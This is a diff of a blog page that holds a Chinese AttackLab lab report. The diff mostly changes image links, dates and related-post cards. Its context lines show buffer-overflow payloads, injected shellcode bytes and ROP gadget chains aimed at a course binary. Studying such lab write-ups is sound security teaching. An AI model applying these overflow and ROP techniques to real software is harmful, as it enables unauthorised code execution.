@@ -368,7 +368,7 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/6.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/1.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
@@ -433,7 +433,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2024-06-30
+                    2024-07-02
                 </div>
                 
 
@@ -470,7 +470,7 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="Lab-2-AttackLab-实验报告"><a href="#Lab-2-AttackLab-实验报告" class="headerlink" title="Lab 2 AttackLab 实验报告"></a>Lab 2 AttackLab 实验报告</h1><h2 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h2><ul>
+                <h2 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h2><ul>
 <li>学习 <code>GDB</code>与 <code>OBJDUMP</code> 的用法;</li>
 <li>了解如何对没有保证缓冲区溢出安全的程序进行攻击;</li>
 <li>熟悉 <code>x86-64</code> 构架下程序栈和参数传递的运行过程.</li>
@@ -513,7 +513,7 @@
 <li>将 <code>getbuf</code> 函数栈上分配的空间填满, 并且在下 <code>8</code> 个字节, 即正常返回地址上填充 <code>touch1</code> 的地址.</li>
 <li><code>getbuf</code> 函数执行 <code>ret</code> 指令后, 会从 <code>%rsp+56</code> 处获取返回地址, 而这块地址被改为 <code>touch1</code> 的地址, 程序返回 <code>touch1</code> 而非 <code>test</code>.</li>
 </ul>
-<p><img src="/pic/36.png" alt="栈帧结构"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301949599.png" alt=""></p>
 <p>现在构建输入字符串: 首先使用 <code>0x00</code> 填充栈上 <code>56</code> 个字节, 然后填充<code>touch1</code>地址, 注意字节序为小端序存储.</p>
 <pre class="line-numbers language-none"><code class="language-none"># 1.txt
 00 00 00 00 00 00 00 00
@@ -590,7 +590,7 @@ Disassembly of section .text:
 <span class="token variable">$1</span> <span class="token operator">=</span> 0x55633168
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>从而 <code>%rsp</code> 为 <code>0x55633168</code>.</p>
-<p><img src="/pic/37.png" alt="栈帧结构"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301949600.png" alt=""></p>
 <p>下面构建输入字符串: 首先注入攻击代码, 然后使用 <code>0x00</code> 填充满栈上 <code>56</code> 个字节, 最后填充攻击代码的起始地址.</p>
 <pre class="line-numbers language-none"><code class="language-none"># 2.txt
 48 c7 c7 ac 93 bf 36 68
@@ -654,7 +654,7 @@ Disassembly of section .text:
    c:	c3                   	retq   
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>我们只需将指令序列 <code>48 c7 c7 a8 31 63 55 68 4e 1e 40 00 c3</code> 注入栈顶.</p>
-<p><img src="/pic/38.png" alt="栈帧结构"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301949601.png" alt=""></p>
 <p>下面构建输入字符串: 首先注入攻击代码, 然后使用 <code>0x00</code> 填充满栈上 <code>56</code> 个字节, 最后填充攻击代码的起始地址, 并保存 <code>cookie</code> 字符串.</p>
 <pre class="line-numbers language-none"><code class="language-none"># 3.txt
 48 c7 c7 a8 31 63 55 68  &lt;----- 注入代码
@@ -687,7 +687,7 @@ movq %rax, %rdi # 将 cookie 存入 %rdi
   401f1c:	c3                   	retq   
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 <p>得出 <code>movq %rax, %rdi</code> 指令的地址为 <code>0x401f19</code>.</p>
-<p><img src="/pic/39.png" alt="栈帧结构"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301949602.png" alt=""></p>
 <p>下面构建输入字符串: 首先填充 <code>popq %rax</code> 指令, 注入 <code>cookie</code> 的值, 接着填入 <code>movq %rax, %rdi</code> 指令与 <code>touch2</code> 函数的起始地址.</p>
 <pre class="line-numbers language-undefined" data-language="undefined"><code class="language-undefined">00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00
@@ -737,7 +737,7 @@ movq %edx, %esi
 movq %rax, %rdi
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <p>获取 <code>%rsp</code> 的指令与 <code>cookie</code> 字符串的存储地址间隔了九条 <code>8</code> 字节指令, 因此偏移量为 <code>0x48</code>.</p>
-<p><img src="/pic/40.png" alt="栈帧结构"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301958223.png" alt=""></p>
 <p>下面构建输入字符串:</p>
 <pre class="line-numbers language-none"><code class="language-none">00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00
@@ -757,8 +757,7 @@ a9 20 40 00 00 00 00 00  &lt;----- movq %edx, %esi
 19 1f 40 00 00 00 00 00  &lt;----- movq %rax, %rdi
 4e 1e 40 00 00 00 00 00  &lt;----- touch3 的起始地址
 33 36 62 66 39 33 61 63
-00                       &lt;----- cookie 字符串
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+00                       &lt;----- cookie 字符串<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
                 
             </div>
@@ -907,23 +906,23 @@ a9 20 40 00 00 00 00 00  &lt;----- movq %edx, %esi
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2022/11/27/xing-shi-yu-yan-yu-zi-dong-ji-zuo-ye-6/">
+                <a href="/2022/12/05/shu-ju-jie-gou-circuit/">
                     <div class="card-image">
                         
-                        <img src="/medias/featureimages/7.jpg" class="responsive-img" alt="形式语言与自动机 作业6">
+                        <img src="/medias/featureimages/2.jpg" class="responsive-img" alt="Circuit">
                         
-                        <span class="card-title">形式语言与自动机 作业6</span>
+                        <span class="card-title">Circuit</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            形式语言与自动机 Hw6
+                            DSA 4-1 解题报告
                         
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2022-11-27
+                            <i class="far fa-clock fa-fw icon-date"></i>2022-12-05
                         </span>
                         <span class="publish-author">
                             
@@ -933,8 +932,8 @@ a9 20 40 00 00 00 00 00  &lt;----- movq %edx, %esi
                                     CS
                                 </a>
                             
-                            <a href="/categories/CS/Automata/" class="post-category">
-                                    Automata
+                            <a href="/categories/CS/DSA/" class="post-category">
+                                    DSA
                                 </a>
                             
                             
@@ -944,8 +943,8 @@ a9 20 40 00 00 00 00 00  &lt;----- movq %edx, %esi
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/Automata/">
-                        <span class="chip bg-color">Automata</span>
+                    <a href="/tags/DSA/">
+                        <span class="chip bg-color">DSA</span>
                     </a>
                     
                 </div>
@@ -962,7 +961,7 @@ a9 20 40 00 00 00 00 00  &lt;----- movq %edx, %esi
                 <a href="/2022/11/23/shu-ju-jie-gou-nearest-neighbour/">
                     <div class="card-image">
                         
-                        <img src="/medias/featureimages/5.jpg" class="responsive-img" alt="Nearest Neighbour">
+                        <img src="/medias/featureimages/25.jpg" class="responsive-img" alt="Nearest Neighbour">
                         
                         <span class="card-title">Nearest Neighbour</span>
                     </div>
@@ -1150,7 +1149,7 @@ a9 20 40 00 00 00 00 00  &lt;----- movq %edx, %esi
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">131.8k</span>
+                        class="white-color">124k</span>
             
             
             
